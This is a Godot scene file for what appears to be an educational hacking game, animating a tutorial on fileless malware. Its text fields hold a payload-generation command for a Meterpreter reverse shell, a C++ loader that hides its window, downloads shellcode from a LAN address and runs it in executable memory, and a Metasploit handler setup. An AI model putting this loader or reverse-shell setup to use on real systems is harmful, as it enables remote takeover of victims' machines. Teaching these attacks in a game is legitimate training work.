[gd_scene load_steps=47 format=3 uid="uid://biq1t4o3no8ef"]

[ext_resource type="PackedScene" uid="uid://cnlake8o686ww" path="res://Scenes/gui/CleanUI/icon.tscn" id="1_hq362"]
[ext_resource type="Script" uid="uid://bkb8jr7yeiwnk" path="res://Scenes/Attacks/Final Attack GUI/fileless.gd" id="1_tpj4y"]
[ext_resource type="Script" uid="uid://cpwr37ebspmj0" path="res://addons/RadialMenu/RadialMenu.gd" id="2_b8r0q"]
[ext_resource type="Script" uid="uid://bwie15hglluo4" path="res://Scenes/Attacks/Final Attack GUI/fileless_terminal.gd" id="4_tpj4y"]
[ext_resource type="PackedScene" uid="uid://bcejk3vddejkh" path="res://Scenes/gui/CleanUI/window.tscn" id="5_eat0j"]
[ext_resource type="Script" uid="uid://btalbkmaah46c" path="res://Scripts/GUI/desktop.gd" id="7_8rtlk"]
[ext_resource type="Script" uid="uid://d2mld0qdmh24y" path="res://Scenes/Attacks/Final Attack GUI/FilelessMalware/fileless_desktop.gd" id="7_15poh"]

[sub_resource type="Shader" id="Shader_wwpmy"]
code = "shader_type canvas_item;
render_mode blend_mix, unshaded;

// The full color of the rectangle
uniform vec4 rect_color : source_color = vec4(1.0, 0.2, 0.2, 1.0); // red

// Hole configuration
uniform vec2 hole_position = vec2(0.0, 0.0); // Top-left corner of the hole (in pixels)
uniform vec2 hole_size = vec2(50.0, 50.0);   // Width and height of the hole (square or rectangle)

void fragment() {
    // Convert UV to local pixel coordinates
    vec2 pixel_pos = UV * vec2(textureSize(TEXTURE, 0));

    // Check if we're inside the hole area
    bool in_hole = pixel_pos.x > hole_position.x &&
                   pixel_pos.x < hole_position.x + hole_size.x &&
                   pixel_pos.y > hole_position.y &&
                   pixel_pos.y < hole_position.y + hole_size.y;

    if (in_hole) {
        discard; // Make transparent
    }

    COLOR = rect_color;
}
"

[sub_resource type="ShaderMaterial" id="ShaderMaterial_j4e7k"]
shader = SubResource("Shader_wwpmy")
shader_parameter/rect_color = Color(0, 0, 0, 0.607843)
shader_parameter/hole_position = Vector2(-0.02, 0)
shader_parameter/hole_size = Vector2(4.035, 4.1)

[sub_resource type="CompressedTexture2D" id="CompressedTexture2D_gq7c2"]
load_path = "res://.godot/imported/_icons.png-ab2725697d4ff2a5f87fb0b310ad6903.ctex"

[sub_resource type="AtlasTexture" id="AtlasTexture_15poh"]
atlas = SubResource("CompressedTexture2D_gq7c2")
region = Rect2(32, 160, 32, 32)

[sub_resource type="CompressedTexture2D" id="CompressedTexture2D_d3ylh"]
load_path = "res://.godot/imported/_icons.png-ab2725697d4ff2a5f87fb0b310ad6903.ctex"

[sub_resource type="AtlasTexture" id="AtlasTexture_o4fi6"]
atlas = SubResource("CompressedTexture2D_d3ylh")
region = Rect2(96, 256, 32, 32)

[sub_resource type="CompressedTexture2D" id="CompressedTexture2D_htfik"]
load_path = "res://.godot/imported/_icons.png-ab2725697d4ff2a5f87fb0b310ad6903.ctex"

[sub_resource type="AtlasTexture" id="AtlasTexture_5bo41"]
atlas = SubResource("CompressedTexture2D_htfik")
region = Rect2(64, 96, 32, 32)

[sub_resource type="Animation" id="Animation_eat0j"]
length = 0.001
tracks/0/type = "value"
tracks/0/imported = false
tracks/0/enabled = true
tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
tracks/0/interp = 1
tracks/0/loop_wrap = true
tracks/0/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["root@cali :~ # msfpoison -p windows/meterpreter/reverse_tcp LHOST=
<C&C Server IP Address>  LPORT=<C&C Server Port> --platform windowds 
--arch x86 -f c -o shellcode.txt

[-] No platform was selected, choosing Msf::Module::Platform::Windows 
from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 333 bytes
Saved as: shellcode.txt
root@cali:- # clear"]
}
tracks/1/type = "value"
tracks/1/imported = false
tracks/1/enabled = true
tracks/1/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
tracks/1/interp = 1
tracks/1/loop_wrap = true
tracks/1/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["This command is asking Metasploit’s payload maker (msfvenom) to create a special program for Windows that will secretly call back to my computer’s IP and port "]
}
tracks/2/type = "value"
tracks/2/imported = false
tracks/2/enabled = true
tracks/2/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
tracks/2/interp = 1
tracks/2/loop_wrap = true
tracks/2/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(-0.02, 0)]
}
tracks/3/type = "value"
tracks/3/imported = false
tracks/3/enabled = true
tracks/3/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
tracks/3/interp = 1
tracks/3/loop_wrap = true
tracks/3/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(4.035, 4.1)]
}
tracks/4/type = "value"
tracks/4/imported = false
tracks/4/enabled = true
tracks/4/path = NodePath("Fileless/HSplitContainer/CodeEdit/shellcode_generated_window:visible")
tracks/4/interp = 1
tracks/4/loop_wrap = true
tracks/4/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [false]
}
tracks/5/type = "value"
tracks/5/imported = false
tracks/5/enabled = true
tracks/5/path = NodePath("Fileless/HSplitContainer/CodeEdit/shellcode_generated_window/RansomwareApp:value")
tracks/5/interp = 1
tracks/5/loop_wrap = true
tracks/5/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [0.0]
}
tracks/6/type = "value"
tracks/6/imported = false
tracks/6/enabled = true
tracks/6/path = NodePath("Fileless/HSplitContainer/CodeEdit/shellcode_generated_window/VBoxContainer/Body/body_Label_Margin/body_Label:text")
tracks/6/interp = 1
tracks/6/loop_wrap = true
tracks/6/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["Creating File..."]
}
tracks/7/type = "value"
tracks/7/imported = false
tracks/7/enabled = true
tracks/7/path = NodePath("Fileless:visible")
tracks/7/interp = 1
tracks/7/loop_wrap = true
tracks/7/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [false]
}
tracks/8/type = "value"
tracks/8/imported = false
tracks/8/enabled = true
tracks/8/path = NodePath("Margin/Desktop/Icon6:visible")
tracks/8/interp = 1
tracks/8/loop_wrap = true
tracks/8/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [true]
}
tracks/9/type = "value"
tracks/9/imported = false
tracks/9/enabled = true
tracks/9/path = NodePath("Margin:visible")
tracks/9/interp = 1
tracks/9/loop_wrap = true
tracks/9/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [false]
}
tracks/10/type = "value"
tracks/10/imported = false
tracks/10/enabled = true
tracks/10/path = NodePath("WindowsWithShellcode:visible")
tracks/10/interp = 1
tracks/10/loop_wrap = true
tracks/10/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [true]
}
tracks/11/type = "value"
tracks/11/imported = false
tracks/11/enabled = true
tracks/11/path = NodePath("Fileless/HSplitContainer/HFlowContainer/Buttons/Next:visible")
tracks/11/interp = 1
tracks/11/loop_wrap = true
tracks/11/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [false]
}
tracks/12/type = "value"
tracks/12/imported = false
tracks/12/enabled = true
tracks/12/path = NodePath("Fileless/HSplitContainer/HFlowContainer/Buttons/FakeNext:visible")
tracks/12/interp = 1
tracks/12/loop_wrap = true
tracks/12/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [true]
}
tracks/13/type = "value"
tracks/13/imported = false
tracks/13/enabled = true
tracks/13/path = NodePath("WindowsWithShellcode/WindowContainer/move to usb:visible")
tracks/13/interp = 1
tracks/13/loop_wrap = true
tracks/13/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [false]
}
tracks/14/type = "value"
tracks/14/imported = false
tracks/14/enabled = true
tracks/14/path = NodePath("WindowsWithShellcode/WindowContainer/SQLWindow:visible")
tracks/14/interp = 1
tracks/14/loop_wrap = true
tracks/14/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [true]
}
tracks/15/type = "value"
tracks/15/imported = false
tracks/15/enabled = true
tracks/15/path = NodePath("WindowsWithShellcode/WindowContainer/GodotWindow:visible")
tracks/15/interp = 1
tracks/15/loop_wrap = true
tracks/15/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [false]
}
tracks/16/type = "value"
tracks/16/imported = false
tracks/16/enabled = true
tracks/16/path = NodePath("WindowsWithShellcode/WindowContainer/shellcode_txt:visible")
tracks/16/interp = 1
tracks/16/loop_wrap = true
tracks/16/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [false]
}
tracks/17/type = "value"
tracks/17/imported = false
tracks/17/enabled = true
tracks/17/path = NodePath("WindowsWithShellcode/WindowContainer/move to usb/RansomwareApp:value")
tracks/17/interp = 1
tracks/17/loop_wrap = true
tracks/17/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [0.0]
}
tracks/18/type = "value"
tracks/18/imported = false
tracks/18/enabled = true
tracks/18/path = NodePath("WindowsWithShellcode/WindowContainer/move to usb/VBoxContainer/Body/body_Label_Margin/body_Label:text")
tracks/18/interp = 1
tracks/18/loop_wrap = true
tracks/18/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["Copying to Flashdrive..."]
}
tracks/19/type = "value"
tracks/19/imported = false
tracks/19/enabled = true
tracks/19/path = NodePath("WindowsWithShellcode/WindowContainer/Label:text")
tracks/19/interp = 1
tracks/19/loop_wrap = true
tracks/19/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [""]
}
tracks/20/type = "value"
tracks/20/imported = false
tracks/20/enabled = true
tracks/20/path = NodePath("Fileless/HSplitContainer/CodeEdit/shellcode_generated_window/VBoxContainer/Header/Label:text")
tracks/20/interp = 1
tracks/20/loop_wrap = true
tracks/20/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["SourceCode.cpp"]
}
tracks/21/type = "value"
tracks/21/imported = false
tracks/21/enabled = true
tracks/21/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:visible")
tracks/21/interp = 1
tracks/21/loop_wrap = true
tracks/21/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [false]
}

[sub_resource type="Animation" id="Animation_07q5i"]
resource_name = "animation_boilerplate_1"
tracks/0/type = "value"
tracks/0/imported = false
tracks/0/enabled = true
tracks/0/path = NodePath("WindowsWithShellcode:visible")
tracks/0/interp = 1
tracks/0/loop_wrap = true
tracks/0/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [false]
}
tracks/1/type = "value"
tracks/1/imported = false
tracks/1/enabled = true
tracks/1/path = NodePath("Fileless:visible")
tracks/1/interp = 1
tracks/1/loop_wrap = true
tracks/1/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [true]
}
tracks/2/type = "value"
tracks/2/imported = false
tracks/2/enabled = true
tracks/2/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
tracks/2/interp = 1
tracks/2/loop_wrap = true
tracks/2/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["Now let's create our boilerplate"]
}
tracks/3/type = "value"
tracks/3/imported = false
tracks/3/enabled = true
tracks/3/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:visible")
tracks/3/interp = 1
tracks/3/loop_wrap = true
tracks/3/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [false]
}
tracks/4/type = "value"
tracks/4/imported = false
tracks/4/enabled = true
tracks/4/path = NodePath("Fileless/HSplitContainer/CodeEdit/shellcode_generated_window:visible")
tracks/4/interp = 1
tracks/4/loop_wrap = true
tracks/4/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [false]
}
tracks/5/type = "value"
tracks/5/imported = false
tracks/5/enabled = true
tracks/5/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
tracks/5/interp = 1
tracks/5/loop_wrap = true
tracks/5/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [""]
}

[sub_resource type="Animation" id="Animation_ma2p5"]
resource_name = "animation_boilerplate_2"
tracks/0/type = "value"
tracks/0/imported = false
tracks/0/enabled = true
tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
tracks/0/interp = 1
tracks/0/loop_wrap = true
tracks/0/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["#include <iostream>
#include <cpr/cpr.h>
#include <windows.h>"]
}
tracks/1/type = "value"
tracks/1/imported = false
tracks/1/enabled = true
tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
tracks/1/interp = 1
tracks/1/loop_wrap = true
tracks/1/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(0.115, 0.03)]
}
tracks/2/type = "value"
tracks/2/imported = false
tracks/2/enabled = true
tracks/2/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
tracks/2/interp = 1
tracks/2/loop_wrap = true
tracks/2/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(1.19, 0.67)]
}
tracks/3/type = "value"
tracks/3/imported = false
tracks/3/enabled = true
tracks/3/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
tracks/3/interp = 1
tracks/3/loop_wrap = true
tracks/3/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["Now this are just the liblaries that we needed "]
}
tracks/4/type = "value"
tracks/4/imported = false
tracks/4/enabled = true
tracks/4/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:visible")
tracks/4/interp = 1
tracks/4/loop_wrap = true
tracks/4/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [true]
}

[sub_resource type="Animation" id="Animation_4u43o"]
resource_name = "animation_boilerplate_3"
tracks/0/type = "value"
tracks/0/imported = false
tracks/0/enabled = true
tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
tracks/0/interp = 1
tracks/0/loop_wrap = true
tracks/0/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["#include <iostream>
#include <cpr/cpr.h>
#include <windows.h>

int main() {
	 ::ShowWindow(::GetConsoleWindow(), SW_HIDE); // SW_SHOW;"]
}
tracks/1/type = "value"
tracks/1/imported = false
tracks/1/enabled = true
tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
tracks/1/interp = 1
tracks/1/loop_wrap = true
tracks/1/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(0.115, 0.825)]
}
tracks/2/type = "value"
tracks/2/imported = false
tracks/2/enabled = true
tracks/2/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
tracks/2/interp = 1
tracks/2/loop_wrap = true
tracks/2/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(2.94, 0.495)]
}
tracks/3/type = "value"
tracks/3/imported = false
tracks/3/enabled = true
tracks/3/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
tracks/3/interp = 1
tracks/3/loop_wrap = true
tracks/3/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["This line prevents a visible console window from showing, so our program runs silently"]
}

[sub_resource type="Animation" id="Animation_pjxp5"]
resource_name = "animation_boilerplate_4"
tracks/0/type = "value"
tracks/0/imported = false
tracks/0/enabled = true
tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
tracks/0/interp = 1
tracks/0/loop_wrap = true
tracks/0/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["#include <iostream>
#include <cpr/cpr.h>
#include <windows.h>

int main() {
	 ::ShowWindow(::GetConsoleWindow(), SW_HIDE); // SW_SHOW;
	cpr::Response r = cpr::Get(cpr::Url{ \"http://192.168.29.208/home\" });"]
}
tracks/1/type = "value"
tracks/1/imported = false
tracks/1/enabled = true
tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
tracks/1/interp = 1
tracks/1/loop_wrap = true
tracks/1/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(0.115, 1.23)]
}
tracks/2/type = "value"
tracks/2/imported = false
tracks/2/enabled = true
tracks/2/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
tracks/2/interp = 1
tracks/2/loop_wrap = true
tracks/2/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(3.135, 0.29)]
}
tracks/3/type = "value"
tracks/3/imported = false
tracks/3/enabled = true
tracks/3/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
tracks/3/interp = 1
tracks/3/loop_wrap = true
tracks/3/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["Uses the cpr HTTP library to request data from the given address"]
}

[sub_resource type="Animation" id="Animation_0w6mh"]
resource_name = "animation_boilerplate_5"
tracks/0/type = "value"
tracks/0/imported = false
tracks/0/enabled = true
tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
tracks/0/interp = 1
tracks/0/loop_wrap = true
tracks/0/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(0.115, 1.615)]
}
tracks/1/type = "value"
tracks/1/imported = false
tracks/1/enabled = true
tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
tracks/1/interp = 1
tracks/1/loop_wrap = true
tracks/1/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(2.845, 1.65)]
}
tracks/2/type = "value"
tracks/2/imported = false
tracks/2/enabled = true
tracks/2/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
tracks/2/interp = 1
tracks/2/loop_wrap = true
tracks/2/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["This group of lines converts the downloaded text into bytes in memory"]
}
tracks/3/type = "value"
tracks/3/imported = false
tracks/3/enabled = true
tracks/3/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
tracks/3/interp = 1
tracks/3/loop_wrap = true
tracks/3/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["#include <iostream>
#include <cpr/cpr.h>
#include <windows.h>

int main() {
	 ::ShowWindow(::GetConsoleWindow(), SW_HIDE); // SW_SHOW;
	cpr::Response r = cpr::Get(cpr::Url{ \"http://192.168.29.208/home\" });
	char* memBuffer = NULL;
	memBuffer = (char *)r.text.c_str(); 
	
	unsigned char shellcode[382]; // This is the size of shellcode 
	memBuffer += 2; 
	for (size_t count = 0; count < sizeof shellcode - 1; count++) { 
		sscanf_s(memBuffer, \"%02hhx\", &shellcode[count]); 
		memBuffer = memBuffer + 4;
	}"]
}

[sub_resource type="Animation" id="Animation_stl7w"]
resource_name = "animation_boilerplate_6"
tracks/0/type = "value"
tracks/0/imported = false
tracks/0/enabled = true
tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
tracks/0/interp = 1
tracks/0/loop_wrap = true
tracks/0/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["int main() {
	 ::ShowWindow(::GetConsoleWindow(), SW_HIDE); // SW_SHOW;
	cpr::Response r = cpr::Get(cpr::Url{ \"http://192.168.29.208/home\" });
	char* memBuffer = NULL;
	memBuffer = (char *)r.text.c_str(); 
	
	unsigned char shellcode[382]; // This is the size of shellcode 
	memBuffer += 2; 
	for (size_t count = 0; count < sizeof shellcode - 1; count++) { 
		sscanf_s(memBuffer, \"%02hhx\", &shellcode[count]); 
		memBuffer = memBuffer + 4;
	}

	void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, 
 PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof shellcode);
    ((void(*)())exec)();
}"]
}
tracks/1/type = "value"
tracks/1/imported = false
tracks/1/enabled = true
tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
tracks/1/interp = 1
tracks/1/loop_wrap = true
tracks/1/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(0.115, 2.595)]
}
tracks/2/type = "value"
tracks/2/imported = false
tracks/2/enabled = true
tracks/2/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
tracks/2/interp = 1
tracks/2/loop_wrap = true
tracks/2/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(2.845, 1.075)]
}
tracks/3/type = "value"
tracks/3/imported = false
tracks/3/enabled = true
tracks/3/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
tracks/3/interp = 1
tracks/3/loop_wrap = true
tracks/3/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["Reserves memory that can run code, copies the shellcode, and runs it immediately.

Lets create our silent program and proceed to the next step"]
}

[sub_resource type="Animation" id="Animation_1u14y"]
resource_name = "animation_boilerplate_7"
tracks/0/type = "value"
tracks/0/imported = false
tracks/0/enabled = true
tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit/shellcode_generated_window:visible")
tracks/0/interp = 1
tracks/0/loop_wrap = true
tracks/0/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [true]
}
tracks/1/type = "value"
tracks/1/imported = false
tracks/1/enabled = true
tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit/shellcode_generated_window/VBoxContainer/Header/Label:text")
tracks/1/interp = 1
tracks/1/loop_wrap = true
tracks/1/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["SourceCode.cpp"]
}
tracks/2/type = "value"
tracks/2/imported = false
tracks/2/enabled = true
tracks/2/path = NodePath("Fileless/HSplitContainer/CodeEdit/shellcode_generated_window/VBoxContainer/Body/body_Label_Margin/body_Label:text")
tracks/2/interp = 1
tracks/2/loop_wrap = true
tracks/2/keys = {
"times": PackedFloat32Array(0, 1),
"transitions": PackedFloat32Array(1, 1),
"update": 1,
"values": ["Creating program...", "Program created!!!"]
}
tracks/3/type = "value"
tracks/3/imported = false
tracks/3/enabled = true
tracks/3/path = NodePath("Fileless/HSplitContainer/CodeEdit/shellcode_generated_window/RansomwareApp:value")
tracks/3/interp = 1
tracks/3/loop_wrap = true
tracks/3/keys = {
"times": PackedFloat32Array(0, 1),
"transitions": PackedFloat32Array(1, 1),
"update": 0,
"values": [0.0, 100.0]
}

[sub_resource type="Animation" id="Animation_8rtlk"]
resource_name = "fileless_1"
tracks/0/type = "value"
tracks/0/imported = false
tracks/0/enabled = true
tracks/0/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
tracks/0/interp = 1
tracks/0/loop_wrap = true
tracks/0/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["This command is asking Metasploit’s payload maker (msfvenom) to create a special program for Windows that will secretly call back to my computer’s IP and port "]
}
tracks/1/type = "value"
tracks/1/imported = false
tracks/1/enabled = true
tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
tracks/1/interp = 1
tracks/1/loop_wrap = true
tracks/1/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["root@cali :~ # msfpoison -p windows/meterpreter/reverse_tcp LHOST=
<C&C Server IP Address>  LPORT=<C&C Server Port> --platform windowds 
--arch x86 -f c -o shellcode.txt"]
}
tracks/2/type = "value"
tracks/2/imported = false
tracks/2/enabled = true
tracks/2/path = NodePath("Margin/Desktop/Icon6:visible")
tracks/2/interp = 1
tracks/2/loop_wrap = true
tracks/2/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [false]
}
tracks/3/type = "value"
tracks/3/imported = false
tracks/3/enabled = true
tracks/3/path = NodePath("Fileless/HSplitContainer/HFlowContainer/Buttons/Next:visible")
tracks/3/interp = 1
tracks/3/loop_wrap = true
tracks/3/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [true]
}
tracks/4/type = "value"
tracks/4/imported = false
tracks/4/enabled = true
tracks/4/path = NodePath("Fileless/HSplitContainer/HFlowContainer/Buttons/FakeNext:visible")
tracks/4/interp = 1
tracks/4/loop_wrap = true
tracks/4/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": [false]
}
tracks/5/type = "value"
tracks/5/imported = false
tracks/5/enabled = true
tracks/5/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
tracks/5/interp = 1
tracks/5/loop_wrap = true
tracks/5/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(0.13, 0.065)]
}
tracks/6/type = "value"
tracks/6/imported = false
tracks/6/enabled = true
tracks/6/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
tracks/6/interp = 1
tracks/6/loop_wrap = true
tracks/6/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(3.245, 0.625)]
}

[sub_resource type="Animation" id="Animation_4uhwa"]
resource_name = "fileless_10"
tracks/0/type = "value"
tracks/0/imported = false
tracks/0/enabled = true
tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
tracks/0/interp = 1
tracks/0/loop_wrap = true
tracks/0/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["root@cali :~ # msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) >  set LHOST 192.168.56.102
LHOST => 192.168.56.102
msf6 exploit(multi/handler) >  set LPORT 8000
LPORT => 8000"]
}
tracks/1/type = "value"
tracks/1/imported = false
tracks/1/enabled = true
tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
tracks/1/interp = 1
tracks/1/loop_wrap = true
tracks/1/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(2.1, 0.415)]
}
tracks/2/type = "value"
tracks/2/imported = false
tracks/2/enabled = true
tracks/2/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
tracks/2/interp = 1
tracks/2/loop_wrap = true
tracks/2/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 0,
"values": [Vector2(0.115, 1.26)]
}
tracks/3/type = "value"
tracks/3/imported = false
tracks/3/enabled = true
tracks/3/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
tracks/3/interp = 1
tracks/3/loop_wrap = true
tracks/3/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["Same as above — this needs to match the LPORT from your generated payload."]
}

[sub_resource type="Animation" id="Animation_55b8s"]
resource_name = "fileless_11"
tracks/0/type = "value"
tracks/0/imported = false
tracks/0/enabled = true
tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
tracks/0/interp = 1
tracks/0/loop_wrap = true
tracks/0/keys = {
"times": PackedFloat32Array(0),
"transitions": PackedFloat32Array(1),
"update": 1,
"values": ["root@cali :~ # msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) >  set LHOST 192.168.56.102
LHOST => 192.168.56.102
msf6 exploit(multi/handler) >  set LPORT 8000
LPORT => 8000
msf6 exploit(multi/handler) > show options"]
}
